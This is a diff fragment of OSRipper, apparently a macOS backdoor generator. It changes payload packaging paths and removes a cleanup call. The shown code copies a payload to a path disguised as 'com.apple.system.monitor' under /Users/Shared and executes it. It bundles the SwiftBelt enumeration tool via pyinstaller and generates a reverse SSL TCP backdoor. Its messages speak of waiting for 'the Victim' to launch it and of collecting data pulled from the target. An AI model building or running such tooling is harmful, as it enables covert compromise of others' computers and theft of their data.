@@ -418,7 +418,7 @@ anan= __file__
 filename = anan.split('/')
 a=anan.replace(str(filename[-1]), '')
 src1=a+'swiftbelt/Swiftbelt'
-src=a+'ocr/ocr_or'
+src=a+'ocr/Contents/MacOS/ocr_or'
 dest1='/Users/Shared/swift'
 dest='/Users/Shared/com.apple.system.monitor'
 shutil.copyfile(src, dest)
@@ -464,7 +464,7 @@ os.system(dest)
             '''
             hider.write(v)
             hider.close()
-            os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "dist/ocr_or:ocr" '+str(name2))
+            os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2))
 def server():
     import socket
 
@@ -556,7 +556,6 @@ if nscan == "2":
     gen_rev_ssl_tcp()
     postgen()
     rep_syst()
-    cleanup()
     if reps == True:
         print('Generated in dist')
         print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
